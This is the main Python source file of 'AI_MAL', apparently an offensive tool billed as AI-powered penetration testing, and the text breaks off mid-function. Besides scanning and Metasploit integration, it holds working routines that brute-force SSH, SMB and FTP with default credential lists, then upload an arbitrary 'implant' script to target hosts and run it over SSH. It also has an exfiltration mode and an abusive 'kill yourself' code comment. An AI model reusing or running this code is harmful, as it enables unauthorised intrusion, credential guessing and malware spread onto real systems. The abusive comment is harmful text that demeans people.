#!/usr/bin/env python3
"""AI_MAL - AI-Powered Penetration Testing Tool"""

import argparse
import logging
import os
import sys
import time
import asyncio
import json
from typing import Optional, List, Dict, Any, Union, Callable
from datetime import datetime
from pathlib import Path
import platform
from dotenv import load_dotenv
import aiohttp
import io
from urllib.parse import urljoin
import subprocess
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.box import ROUNDED, Box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich import print as rprint
import re

# Import Pygments for syntax highlighting
try:
    from pygments import highlight
    from pygments.lexers import PythonLexer, BashLexer, RubyLexer
    from pygments.formatters import TerminalFormatter
    PYGMENTS_AVAILABLE = True
except ImportError:
    PYGMENTS_AVAILABLE = False

# Suppress asyncio warnings about event loop being closed
import warnings
warnings.filterwarnings("ignore", 
                       message="Exception ignored in.*asyncio.*",
                       category=RuntimeWarning)

# More compatible approach to handle different Python versions
try:
    # For older Python versions
    if hasattr(asyncio, 'events') and hasattr(asyncio.events, 'BaseEventLoop'):
        original_check_closed = asyncio.events.BaseEventLoop._check_closed
        def _patched_check_closed(self) -> None:
            """Patch the event loop's check_closed method to handle closed loops gracefully."""
            if self._closed:
                return
            return original_check_closed(self)
        asyncio.events.BaseEventLoop._check_closed = _patched_check_closed
    # For Python 3.12+
    elif hasattr(asyncio, 'base_events') and hasattr(asyncio.base_events, 'BaseEventLoop'):
        original_check_closed = asyncio.base_events.BaseEventLoop._check_closed
        def _patched_check_closed(self) -> None:
            """Patch the event loop's check_closed method to handle closed loops gracefully."""
            if self._closed:
                return
            return original_check_closed(self)
        asyncio.base_events.BaseEventLoop._check_closed = _patched_check_closed
except (AttributeError, TypeError):
    pass

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.table import Table
    from rich.live import Live
    from rich import print as rprint
    from rich import box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

from AI_MAL.core.adaptive import AdaptiveScanner
from AI_MAL.core.ai_manager import AIManager
from AI_MAL.core.metasploit import MetasploitManager
from AI_MAL.core.script_generator import ScriptGenerator
from AI_MAL.core.network_scanner import NetworkScanner
from AI_MAL.core.openvas_manager import OpenVASManager

# Load environment variables
load_dotenv()

# Configure logging
log_dir = os.getenv('LOG_DIR', 'logs')
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, 'AI_MAL.log')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Set up rich console if available
if RICH_AVAILABLE:
    console = Console()
else:
    console = None

class AI_MAL:
    """Main class for the AI_MAL penetration testing framework."""
    
    def __init__(self, config: Optional[Dict[str, Any]] = None, **kwargs) -> None:
        """
        Initialize the AI_MAL penetration testing framework.
        
        Args:
            config: Configuration dictionary with scan parameters.
            **kwargs: Additional parameters for customization.
        """
        self.config = config or {}
        self.logger = logging.getLogger("ai_mal")
        
        # Initialize managers
        self._initialize_managers()
        
        # Verify Ollama availability before initializing AI models
        if self.ai_manager.is_ollama_available():
            self.logger.info("Ollama service is available")
            self._initialize_ai_models()
        else:
            self.logger.warning("Ollama service is not available - AI analysis will be limited")
        
        # Check if OpenVAS is available
        try:
            import asyncio
            openvas_status = asyncio.run(self.openvas_manager.check_openvas_status())
            if openvas_status["installed"]:
                self.logger.info("OpenVAS is installed")
                if openvas_status["openvas_running"]:
                    self.logger.info("OpenVAS services are running")
                    self.openvas_available = True
                else:
                    self.logger.warning("OpenVAS is installed but services are not running")
                    self.openvas_available = False
            else:
                self.logger.warning("OpenVAS is not installed - vulnerability scanning will use Nmap")
                self.openvas_available = False
        except Exception as e:
            self.logger.warning(f"Failed to check OpenVAS status: {str(e)}")
            self.openvas_available = False
        
        # Check MSF availability
        if self.msf_manager.is_msf_available():
            self.logger.info("Metasploit Framework is available")
            self.msf_available = True
        else:
            self.logger.warning("Metasploit Framework is not available - exploitation features will be limited")
            self.msf_available = False
        
        # Parse arguments
        self.verbose = kwargs.get("verbose", False)
        self.ai_analysis = kwargs.get("ai_analysis", False)
        self.exploit_generation = kwargs.get("generate_exploits", False)
        self.msf_execution = kwargs.get("run_msf", False)
        
        # Set up logging directory
        log_dir = kwargs.get('log_dir', os.getenv('LOG_DIR', 'logs'))
        if not os.path.isabs(log_dir) and 'INSTALL_DIR' in os.environ:
            log_dir = os.path.join(os.environ['INSTALL_DIR'], log_dir)
        try:
            os.makedirs(log_dir, exist_ok=True)
            logger.info(f"Using log directory: {log_dir}")
        except Exception as e:
            logger.warning(f"Failed to create log directory {log_dir}: {str(e)}")
            # Fallback to current directory
            log_dir = os.path.join(os.getcwd(), 'logs')
            os.makedirs(log_dir, exist_ok=True)
            logger.info(f"Using fallback log directory: {log_dir}")
        
        # Initialize scanner
        self.scanner = AdaptiveScanner(kwargs.get('target', ''))
        
        # Set UI options
        self.quiet = kwargs.get('quiet', False)
        self.no_gui = kwargs.get('no_gui', False)
        
        # Setup for data exfiltration
        self.exfil_enabled = kwargs.get('exfil', False)
        if self.exfil_enabled:
            self.exfil_dir = Path(os.getenv('EXFIL_DIR', 'exfiltrated_data'))
            self.exfil_dir.mkdir(exist_ok=True)
            self.exfil_target_dir = self.exfil_dir / kwargs.get('target', '').replace('.', '_')
            self.exfil_target_dir.mkdir(exist_ok=True)
            logger.info(f"Data exfiltration enabled. Files will be saved to {self.exfil_target_dir}")
        else:
            logger.warning("Data exfiltration is not enabled")
        
        # Setup for implant deployment
        self.implant_enabled = kwargs.get('implant') is not None
        self.implant_path = kwargs.get('implant')
        if self.implant_enabled:
            if not os.path.exists(self.implant_path):
                logger.error(f"Implant script not found: {self.implant_path}")
                self.implant_enabled = False
            else:
                logger.info(f"Implant enabled. Will attempt to deploy {self.implant_path} to target systems")
                # Create directory for implant logs
                self.implant_logs_dir = Path(os.getenv('IMPLANT_LOGS_DIR', 'implant_logs'))
                self.implant_logs_dir.mkdir(exist_ok=True)
                logger.info(f"Using implant logs directory: {self.implant_logs_dir}")
        
    def _initialize_managers(self) -> None:
        """
        Initialize the various managers used by AI_MAL.
        """
        try:
            # AI manager for analysis
            self.ai_manager = AIManager(
                model=self.config.get('model', os.getenv('OLLAMA_MODEL', 'artifish/llama3.2-uncensored')),
                fallback_model=self.config.get('fallback_model', os.getenv('OLLAMA_FALLBACK_MODEL', 'gemma:1b'))
            )
            
            # Create a workspace name based on target and timestamp
            target = self.config.get('target', 'unknown')
            workspace = f"AI_MAL_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d')}"
            self.msf_manager = MetasploitManager(workspace=workspace)
            
            # Script generator for creating custom scripts
            self.script_generator = ScriptGenerator()
            
            # Network scanner for reconnaissance
            self.network_scanner = NetworkScanner(config=self.config.get("scanner", {}))
            
            # OpenVAS manager for vulnerability scanning
            self.openvas_manager = OpenVASManager(config=self.config.get("openvas", {}))
            
            self.logger.debug("All managers initialized successfully")
        except Exception as e:
            self.logger.error(f"Error initializing managers: {str(e)}")
            if self.config.get('verbose', False):
                self.logger.exception("Manager initialization exception:")
        
    def run(self, target: Optional[str] = None, scan_type: str = "basic", **kwargs) -> Dict[str, Any]:
        """
        Run the AI_MAL scan and analysis.
        
        Args:
            target: Target IP address, network range, or hostname.
            scan_type: Type of scan to perform ('basic', 'stealth', 'aggressive', 'openvas').
            **kwargs: Additional scan parameters.
            
        Returns:
            Dict containing scan results and analysis information.
        """
        if not target:
            if "target" in self.config:
                target = self.config["target"]
            else:
                error_msg = "No target specified for scan"
                self.logger.error(error_msg)
                return {"error": error_msg}
        
        # Update arguments from kwargs
        self.verbose = kwargs.get("verbose", self.verbose)
        self.ai_analysis = kwargs.get("ai_analysis", self.ai_analysis)
        self.exploit_generation = kwargs.get("generate_exploits", self.exploit_generation)
        self.msf_execution = kwargs.get("run_msf", self.msf_execution)
        
        # Log enabled features
        if self.verbose:
            self.logger.setLevel(logging.DEBUG)
            self.logger.debug("Verbose logging enabled")
        
        self.logger.info(f"Starting scan on target: {target}")
        
        # Check AI analysis availability
        if self.ai_analysis:
            self.logger.info("AI analysis enabled")
            
            # Verify Ollama availability again before starting scan
            if not self.ai_manager.is_ollama_available():
                self.logger.warning("Ollama service is not available - AI analysis will be skipped")
                self.ai_analysis = False
        
        # Check MSF availability
        if self.msf_execution:
            self.logger.info("Metasploit execution enabled")
            if not self.msf_manager.is_msf_available():
                self.logger.warning("Metasploit is not available - MSF functions will be skipped")
                self.msf_execution = False
        
        # Log exploit generation status
        if self.exploit_generation:
            self.logger.info("Exploit generation enabled")
        
        # If scan_type is "openvas", run an OpenVAS scan
        if scan_type == "openvas":
            self.logger.info(f"Running OpenVAS vulnerability scan on {target}")
            results = asyncio.run(self.run_openvas_scan(
                target=target,
                scan_name=kwargs.get("scan_name"),
                scan_config=kwargs.get("scan_config", "full_and_fast")
            ))
            
            if "error" in results:
                # If OpenVAS fails, fall back to Nmap if requested
                if kwargs.get("fallback_to_nmap", True):
                    self.logger.warning(f"OpenVAS scan failed: {results['error']}. Falling back to Nmap")
                    # Continue with Nmap scan below by not returning here
                else:
                    self.logger.error(f"OpenVAS scan error: {results['error']}")
                    return results
            else:
                # OpenVAS scan succeeded
                self.logger.info(f"OpenVAS scan completed for {target}")
                if not self.quiet:
                    self._display_openvas_results(results)
                return results
        
        # For non-OpenVAS scans or if OpenVAS failed and fallback is enabled
        try:
            # Build scan configuration for Nmap scan
            scan_config = self._build_scan_config(target, scan_type, **kwargs)
            
            # Initialize network scanner with configuration
            self.logger.info(f"Initializing network scanner with {scan_type} scan configuration")
            self.scanner = NetworkScanner(scan_config)
            
            # Run the scan
            self.logger.info("Running Nmap scan")
            scan_results = self.scanner.scan()
            if "error" in scan_results:
                self.logger.error(f"Scan failed: {scan_results['error']}")
                return scan_results
            
            # Process scan results
            processed_results = self._process_scan_results(scan_results)
            
            # Display scan summary
            if not self.quiet:
                self._display_scan_summary(processed_results)
            
            # Perform AI analysis if enabled
            if self.ai_analysis:
                analysis = self.ai_manager.analyze_results(processed_results)
                if not self.quiet:
                    self._display_ai_results(analysis)
                processed_results["ai_analysis"] = analysis
            
            # Generate exploits if enabled
            if self.exploit_generation:
                try:
                    exploits = self.msf_manager.generate_exploits(processed_results)
                    processed_results["exploits"] = exploits
                except Exception as e:
                    self.logger.error(f"Exploit generation failed: {str(e)}")
                    if self.verbose:
                        self.logger.exception("Full exception:")
            
            # Generate custom scripts if enabled
            if self.config.get("custom_scripts"):
                try:
                    scripts = self.script_generator.generate_scripts(processed_results)
                    processed_results["scripts"] = scripts
                except Exception as e:
                    self.logger.error(f"Script generation failed: {str(e)}")
                    if self.verbose:
                        self.logger.exception("Full exception:")
            
            return processed_results
            
        except Exception as e:
            error_msg = f"Error during scan execution: {str(e)}"
            self.logger.error(error_msg)
            if self.verbose:
                self.logger.exception("Full exception:")
            return {"error": error_msg}

    def _get_network_interfaces(self) -> List[str]:
        """Get available network interfaces."""
        try:
            import netifaces
            interfaces = netifaces.interfaces()
            # Filter out loopback and docker interfaces
            valid_interfaces = [
                iface for iface in interfaces 
                if not iface.startswith(('lo', 'docker', 'br-', 'veth'))
            ]
            return valid_interfaces
        except Exception as e:
            self.logger.error(f"Error getting network interfaces: {str(e)}")
            return []
            # jesus this code is absolute dogshit whoever made this kill yourself
    def _show_banner(self):
        """Show the AI_MAL welcome banner"""
        banner = """
    █████╗ ██╗      ███╗   ███╗ █████╗ ██╗     
   ██╔══██╗██║      ████╗ ████║██╔══██╗██║     
   ███████║██║█████╗██╔████╔██║███████║██║     
   ██╔══██║██║╚════╝██║╚██╔╝██║██╔══██║██║     
   ██║  ██║██║      ██║ ╚═╝ ██║██║  ██║███████╗
   ╚═╝  ╚═╝╚═╝      ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
                                                 
   AI-Powered Penetration Testing Tool
        """
        console.print(Panel(banner, border_style="green"))
        console.print(f"Target: [bold red]{self.config.get('target', 'Unknown')}[/bold red]")
        
        # Display primary and fallback models
        primary_model = self.ai_manager.model
        fallback_model = self.ai_manager.fallback_model
        console.print(f"Primary AI: [bold cyan]{primary_model}[/bold cyan]")
        
        if fallback_model:
            console.print(f"Fallback AI: [bold blue]{fallback_model}[/bold blue]")
        
        # Display available models
        if self.ai_manager.available_models:
            model_count = len(self.ai_manager.available_models)
            console.print(f"Available models: [green]{model_count}[/green] Ollama models detected")
            
        # Display additional scan information
        scan_type = "Aggressive" if self.config.get('vuln', False) else "Stealth" if self.config.get('stealth', False) else "Standard"
        console.print(f"Scan type: [yellow]{scan_type}[/yellow]")
        
        if self.config.get('msf', False):
            console.print(f"[red]Metasploit integration: Enabled[/red]")
            
        if self.config.get('full_auto', False):
            console.print(f"[red bold]Full auto mode: Enabled[/red bold]")
            
        console.print()
        
    def _display_scan_summary(self, scan_results: Dict[str, Any]):
        """Display a summary of scan results in a table"""
        if not RICH_AVAILABLE or self.quiet:
            return
            
        table = Table(title=f"Scan Summary for {self.config.get('target', 'Unknown')}")
        table.add_column("Host", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Open Ports", style="yellow")
        table.add_column("OS", style="magenta")
        
        for host in scan_results.get('hosts', []):
            ip = host.get('ip', 'Unknown')
            status = host.get('status', 'Unknown')
            
            # Get open ports
            open_ports = []
            for port_info in host.get('ports', []):
                if port_info.get('state') == 'open':
                    port = port_info.get('port')
                    service = port_info.get('service', '')
                    open_ports.append(f"{port}/{service}")
            
            ports_str = ", ".join(open_ports[:5])
            if len(open_ports) > 5:
                ports_str += f" (+{len(open_ports) - 5} more)"
                
            # Get OS info
            os_info = host.get('os', {}).get('name', 'Unknown')
            
            table.add_row(ip, status, ports_str, os_info)
            
        console.print(table)
        
    def _display_ai_results(self, analysis: Dict[str, Any]) -> None:
        """Display AI analysis results in a formatted box."""
        try:
            if not analysis:
                self.logger.warning("No AI analysis results to display")
                return
            
            console = Console()
            
            # Create a table for the results
            table = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
            table.add_column("Category", style="cyan")
            table.add_column("Details", style="white")

            # Add rows based on analysis content
            if "target_analysis" in analysis:
                table.add_row("Target Analysis", analysis["target_analysis"])
            if "vulnerabilities" in analysis:
                table.add_row("Vulnerabilities", analysis["vulnerabilities"])
            if "recommendations" in analysis:
                table.add_row("Recommendations", analysis["recommendations"])
            if "model_used" in analysis:
                table.add_row("Model Used", analysis["model_used"])

            # Display the table in a panel
            console.print(Panel(table, title="AI Analysis Results", border_style="green"))
            
        except Exception as e:
            self.logger.error(f"Error displaying AI results: {str(e)}")
            console.print(f"[red]Error displaying AI results: {str(e)}[/red]")
        
    def _display_exploits(self, exploits: List[Dict[str, Any]]):
        """Display found Metasploit exploits in a table"""
        if not RICH_AVAILABLE or self.quiet or not exploits:
            return
            
        # Define a consistent fixed-width table layout
        table = Table(
            title=f"Potential Exploits for {self.config.get('target', 'Unknown')}",
            box=box.MINIMAL_HEAVY_HEAD,
            show_header=True,
            header_style="bold",
            padding=(1, 2),
            collapse_padding=False,
            min_width=80
        )
        
        # Use fixed column widths to ensure proper alignment
        table.add_column("Name", style="cyan", width=30, no_wrap=True)
        table.add_column("Rank", style="green", width=15, justify="center")
        table.add_column("Description", style="yellow", width=40)
        
        # Only show top 10 exploits
        for exploit in exploits[:10]:  
            name = exploit.get('name', 'Unknown')
            rank = exploit.get('rank', 'Unknown').strip()
            description = exploit.get('description', 'No description').strip()
            
            # Truncate long names and add ellipsis
            if len(name) > 28:
                name = name[:25] + "..."
            
            # Set color based on rank
            rank_style = {
                'excellent': 'bright_green',
                'great': 'green',
                'good': 'yellow',
                'normal': 'blue',
                'average': 'cyan',
                'low': 'magenta',
                'manual': 'red'
            }.get(rank.lower(), 'white')
            
            styled_rank = f"[{rank_style}]{rank}[/{rank_style}]"
            
            # Add row
            table.add_row(name, styled_rank, description)
            
        if len(exploits) > 10:
            console.print(f"\nShowing 10 of {len(exploits)} exploits")
            
        console.print(table)
        
    def _display_scripts(self, scripts: List[Dict[str, Any]]):
        """Display generated scripts in a table"""
        if not RICH_AVAILABLE or self.quiet or not scripts:
            return
            
        table = Table(title="Generated Scripts")
        table.add_column("Name", style="cyan")
        table.add_column("Type", style="green")
        table.add_column("Description", style="yellow")
        table.add_column("Path", style="magenta")
        
        for script in scripts:
            name = script.get('name', 'Unknown')
            script_type = script.get('type', 'Unknown')
            description = script.get('description', 'No description')
            path = script.get('path', 'Unknown')
            
            table.add_row(name, script_type, description, path)
            
        console.print(table)
        
        # Show script content with syntax highlighting if Pygments is available
        if PYGMENTS_AVAILABLE:
            for script in scripts:
                path = script.get('path')
                if path and os.path.exists(path):
                    try:
                        with open(path, 'r') as f:
                            content = f.read()
                        
                        # Get appropriate lexer based on file extension
                        try:
                            lexer = PythonLexer() if path.endswith('.py') else \
                                    BashLexer() if path.endswith('.sh') or path.endswith('.bash') else \
                                    RubyLexer() if path.endswith('.rb') else \
                                    None
                        except:
                            # Fallback to Python if can't determine
                            extension = os.path.splitext(path)[1].lower()
                            if extension in ['.sh', '.bash']:
                                lexer = BashLexer()
                            elif extension in ['.bat', '.cmd']:
                                lexer = None
                            elif extension in ['.ps1']:
                                lexer = None
                            else:
                                lexer = PythonLexer()
                        
                        # Apply syntax highlighting
                        formatted = highlight(content, lexer, TerminalFormatter())
                        
                        # Display the script
                        console.print(f"\n[bold cyan]Script: {os.path.basename(path)}[/bold cyan]")
                        console.print(Panel(formatted, border_style="green"))
                        
                    except Exception as e:
                        logger.debug(f"Error displaying script content: {str(e)}")
        
    def _display_exfil_results(self, results: Dict[str, Any]):
        """Display exfiltration results in a table"""
        if not RICH_AVAILABLE or self.quiet or not results:
            return
            
        # Create a table for the exfiltration results
        table = Table(title=f"[bold red]Data Exfiltration Results[/bold red]")
        table.add_column("Status", style="bold")
        table.add_column("Details", style="cyan")
        
        # Status row
        status = "[green]SUCCESS[/green]" if results.get('success', False) else "[red]FAILED[/red]"
        table.add_row("Status", status)
        
        # Files retrieved
        files_count = results.get('files_retrieved', 0)
        files_style = "green" if files_count > 0 else "red"
        table.add_row("Files Retrieved", f"[{files_style}]{files_count}[/{files_style}]")
        
        # Methods succeeded
        methods = results.get('methods_succeeded', [])
        methods_str = ", ".join(methods) if methods else "None"
        table.add_row("Successful Methods", methods_str)
        
        # Methods attempted
        attempted = results.get('methods_attempted', [])
        attempted_str = ", ".join(attempted) if attempted else "None"
        table.add_row("Attempted Methods", attempted_str)
        
        # Storage location
        if files_count > 0:
            table.add_row("Storage Location", str(self.exfil_target_dir))
        
        console.print(table)
        
        # If successful, show a warning about the exfiltrated data
        if results.get('success', False):
            console.print(Panel(
                "[bold yellow]Warning:[/bold yellow] Sensitive data may have been exfiltrated. "
                "Review the contents carefully and handle according to your security policy.",
                border_style="red"
            ))

    def _display_implant_results(self, results: Dict[str, Any]):
        """Display implant deployment results in a table"""
        if not RICH_AVAILABLE or self.quiet or not results:
            return
            
        # Create a table for the implant results
        table = Table(title=f"[bold red]Implant Deployment Results[/bold red]")
        table.add_column("Status", style="bold")
        table.add_column("Details", style="cyan")
        
        # Status row
        status = "[green]SUCCESS[/green]" if results.get('success', False) else "[red]FAILED[/red]"
        table.add_row("Status", status)
        
        # Targets implanted
        implant_count = len(results.get('successful_targets', []))
        implant_style = "green" if implant_count > 0 else "red"
        table.add_row("Targets Implanted", f"[{implant_style}]{implant_count}[/{implant_style}]")
        
        # Successful targets
        successful = results.get('successful_targets', [])
        successful_str = "\n".join(successful) if successful else "None"
        table.add_row("Successful Targets", successful_str)
        
        # Failed targets
        failed = results.get('failed_targets', [])
        failed_str = "\n".join(failed) if failed else "None"
        table.add_row("Failed Targets", failed_str)
        
        # Methods succeeded
        methods = results.get('methods_succeeded', [])
        methods_str = ", ".join(methods) if methods else "None"
        table.add_row("Successful Methods", methods_str)
        
        # Implant file
        table.add_row("Implant Script", str(self.implant_path))
        
        console.print(table)
        
        # If successful, show a warning about the implanted targets
        if results.get('success', False):
            console.print(Panel(
                "[bold yellow]Warning:[/bold yellow] Implants have been deployed to target systems. "
                "Ensure proper cleanup once operations are complete.",
                border_style="red"
            ))

    async def _deploy_implant(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to deploy implant script to target systems using multiple methods
        
        Args:
            scan_results: Results from nmap scan containing target information
            
        Returns:
            Dictionary with implant deployment results
        """
        if not self.implant_enabled or not self.implant_path:
            return {'success': False}
            
        logger.info(f"Starting implant deployment to {self.config.get('target', 'Unknown')}")
        results = {
            'success': False,
            'successful_targets': [],
            'failed_targets': [],
            'methods_succeeded': [],
            'methods_attempted': []
        }
        
        hosts = scan_results.get('hosts', [])
        if not hosts:
            logger.warning("No hosts found in scan results for implant deployment")
            return results
        
        # Read the implant script
        try:
            with open(self.implant_path, 'rb') as f:
                implant_content = f.read()
        except Exception as e:
            logger.error(f"Error reading implant script: {str(e)}")
            return results
            
        # Determine script type based on extension
        script_extension = os.path.splitext(self.implant_path)[1].lower()
        
        # Create timestamp for this deployment attempt
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        implant_log_file = self.implant_logs_dir / f"implant_log_{timestamp}.txt"
        
        # Log the deployment attempt
        with open(implant_log_file, 'w') as log:
            log.write(f"Implant deployment at {timestamp}\n")
            log.write(f"Target: {self.config.get('target', 'Unknown')}\n")
            log.write(f"Implant: {self.implant_path}\n\n")
        
        for host in hosts:
            ip = host.get('ip')
            if not ip:
                continue
                
            logger.info(f"Attempting to deploy implant to {ip}")
            
            # Log current host
            with open(implant_log_file, 'a') as log:
                log.write(f"\nAttempting to implant {ip}:\n")
            
            # Extract information about open ports and services
            open_ports = {}
            for port_info in host.get('ports', []):
                if port_info.get('state') == 'open':
                    port = port_info.get('port')
                    service = port_info.get('service', '')
                    open_ports[port] = service
            
            # Attempt different implant methods based on available services
            implant_success = False
            
            # Try SSH implant
            if await self._implant_via_ssh(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('ssh')
                implant_success = True
                
            results['methods_attempted'].append('ssh')
                
            # Try SMB implant
            if await self._implant_via_smb(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('smb')
                implant_success = True
                
            results['methods_attempted'].append('smb')
                
            # Try FTP implant
            if await self._implant_via_ftp(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('ftp')
                implant_success = True
                
            results['methods_attempted'].append('ftp')
            
            # Try HTTP/web upload implant
            if await self._implant_via_http(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('http')
                implant_success = True
                
            results['methods_attempted'].append('http')
            
            # Update results based on success
            if implant_success:
                results['successful_targets'].append(ip)
                results['success'] = True
            else:
                results['failed_targets'].append(ip)
        
        # Log summary
        with open(implant_log_file, 'a') as log:
            log.write("\n\nSummary:\n")
            log.write(f"Successful targets: {len(results['successful_targets'])}\n")
            for target in results['successful_targets']:
                log.write(f"- {target}\n")
            log.write(f"Failed targets: {len(results['failed_targets'])}\n")
            for target in results['failed_targets']:
                log.write(f"- {target}\n")
            log.write(f"Methods succeeded: {', '.join(results['methods_succeeded'])}\n")
        
        logger.info(f"Implant deployment complete. Successful targets: {len(results['successful_targets'])}")
        return results
        
    async def _implant_via_ssh(self, target: str, open_ports: Dict[int, str], 
                             implant_content: bytes, script_extension: str,
                             log_file: Path) -> bool:
        """Deploy implant via SSH if available"""
        try:
            import paramiko
        except ImportError:
            logger.warning("SSH implant requires paramiko module. Install with 'pip install paramiko'")
            return False
            
        # Look for SSH ports (22, 2222, etc)
        ssh_ports = [port for port, service in open_ports.items() 
                    if service.lower() == 'ssh' or port == 22]
        
        if not ssh_ports:
            logger.debug(f"No SSH service detected on {target}")
            return False
            
        # Common username/password combinations to try
        credentials = [
            ('root', 'root'),
            ('root', 'toor'),
            ('root', 'password'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('kali', 'kali')
        ]
        
        script_name = os.path.basename(self.implant_path)
        
        # Prepare execution commands based on script type
        exec_commands = {
            '.py': f"python3 /tmp/{script_name} &",
            '.sh': f"bash /tmp/{script_name} &",
            '.rb': f"ruby /tmp/{script_name} &",
            '.pl': f"perl /tmp/{script_name} &",
            '.php': f"php /tmp/{script_name} &"
        }
        
        default_exec = f"chmod +x /tmp/{script_name} && /tmp/{script_name} &"
        exec_command = exec_commands.get(script_extension, default_exec)
        
        success = False
        for port in ssh_ports:
            for username, password in credentials:
                try:
                    # Connect to SSH server
                    logger.info(f"Attempting SSH implant on {target}:{port} with {username}:{password}")
                    
                    # Log attempt
                    with open(log_file, 'a') as log:
                        log.write(f"  SSH attempt: {target}:{port} with {username}:{password}\n")
                    
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, port=port, username=username, password=password, timeout=10)
                    
                    # Upload the implant script
                    sftp = client.open_sftp()
                    remote_path = f"/tmp/{script_name}"
                    sftp.putfo(io.BytesIO(implant_content), remote_path)
                    sftp.chmod(remote_path, 0o755)  # Make it executable
                    sftp.close()
                    
                    logger.info(f"Successfully uploaded implant to {target} via SSH")
                    with open(log_file, 'a') as log:
                        log.write(f"  [SUCCESS] Uploaded implant to {remote_path}\n")
                    
                    # Execute the implant
                    stdin, stdout, stderr = client.exec_command(exec_command)
                    
                    # Wait briefly for execution to start
                    exit_status = stdout.channel.recv_exit_status()
                    
                    if exit_status == 0:
                        logger.info(f"Successfully executed implant on {target} via SSH")
                        with open(log_file, 'a') as log:
                            log.write(f"  [SUCCESS] Executed implant with command: {exec_command}\n")
                        success = True
                    else:
                        error = stderr.read().decode()
                        logger.warning(f"Failed to execute implant on {target}: {error}")
                        with open(log_file, 'a') as log:
                            log.write(f"  [ERROR] Failed to execute: {error}\n")
                    
                    client.close()
                    
                    if success:
                        return True
                    
                except Exception as e:
                    logger.debug(f"SSH implant attempt failed: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] {str(e)}\n")
                    
        return success
        
    async def _implant_via_smb(self, target: str, open_ports: Dict[int, str],
                             implant_content: bytes, script_extension: str,
                             log_file: Path) -> bool:
        """Deploy implant via SMB if available"""
        try:
            import smbclient
        except ImportError:
            logger.warning("SMB implant requires smbclient module. Install with 'pip install smbclient'")
            return False
            
        # Look for SMB ports (139, 445)
        smb_ports = [port for port, service in open_ports.items() 
                    if service.lower() in ['smb', 'microsoft-ds', 'netbios-ssn'] 
                    or port in [139, 445]]
        
        if not smb_ports:
            logger.debug(f"No SMB service detected on {target}")
            return False
            
        # Common username/password combinations to try
        credentials = [
            ('guest', ''),
            ('', ''),
            ('Administrator', ''),
            ('Administrator', 'administrator'),
            ('Administrator', 'password'),
            ('admin', 'admin'),
            ('user', 'user')
        ]
        
        script_name = os.path.basename(self.implant_path)
        success = False
        
        for username, password in credentials:
            try:
                # Connect to SMB server
                logger.info(f"Attempting SMB implant on {target} with {username}:{password}")
                
                # Log attempt
                with open(log_file, 'a') as log:
                    log.write(f"  SMB attempt: {target} with {username}:{password}\n")
                
                # Configure SMB client
                smbclient.ClientConfig(username=username, password=password)
                
                # Try to find a writable share
                try:
                    shares = smbclient.listdir(f'\\\\{target}\\')
                except Exception as e:
                    logger.debug(f"Error listing SMB shares: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] Listing shares: {str(e)}\n")
                    continue
                
                writable_paths = [
                    (share, '\\Windows\\Temp\\'),
                    (share, '\\Temp\\'),
                    (share, '\\'),
                    ('C$', '\\Windows\\Temp\\'),
                    ('C$', '\\Temp\\'),
                    ('ADMIN$', '\\Temp\\'),
                    ('IPC$', '\\')
                ]
                
                for share, path in writable_paths:
                    try:
                        if share not in shares and not share.endswith('$'):
                            continue
                            
                        # Try to write to this location
                        unc_path = f'\\\\{target}\\{share}{path}{script_name}'
                        
                        logger.debug(f"Attempting to write to {unc_path}")
                        with open(log_file, 'a') as log:
                            log.write(f"  Trying to write to {unc_path}\n")
                        
                        with smbclient.open_file(unc_path, mode='wb') as f:
                            f.write(implant_content)
                            
                        logger.info(f"Successfully uploaded implant to {target} via SMB")
                        with open(log_file, 'a') as log:
                            log.write(f"  [SUCCESS] Uploaded implant to {unc_path}\n")
                            
                        # SMB upload succeeded, but execution is more difficult
                        # We would need a more complex method to execute it remotely
                        # For Windows targets, we could use PsExec or WMI/WinRM if available
                        
                        # For now, just mark as partial success
                        with open(log_file, 'a') as log:
                            log.write(f"  [NOTE] Implant uploaded but not executed. Manual execution required.\n")
                            
                        success = True
                        break
                        
                    except Exception as e:
                        logger.debug(f"Failed to write to {share}{path}: {str(e)}")
                        
                if success:
                    break
                    
            except Exception as e:
                logger.debug(f"SMB implant attempt failed: {str(e)}")
                with open(log_file, 'a') as log:
                    log.write(f"  [ERROR] {str(e)}\n")
                
        return success
        
    async def _implant_via_ftp(self, target: str, open_ports: Dict[int, str],
                             implant_content: bytes, script_extension: str,
                             log_file: Path) -> bool:
        """Deploy implant via FTP if available"""
        import ftplib
        
        # Look for FTP ports (21, 2121, etc)
        ftp_ports = [port for port, service in open_ports.items() 
                    if service.lower() == 'ftp' or port == 21]
        
        if not ftp_ports:
            logger.debug(f"No FTP service detected on {target}")
            return False
            
        # Common username/password combinations to try
        credentials = [
            ('anonymous', 'anonymous@domain.com'),
            ('anonymous', ''),
            ('ftp', 'ftp'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('guest', 'guest')
        ]
        
        script_name = os.path.basename(self.implant_path)
        success = False
        
        for port in ftp_ports:
            for username, password in credentials:
                try:
                    # Connect to FTP server
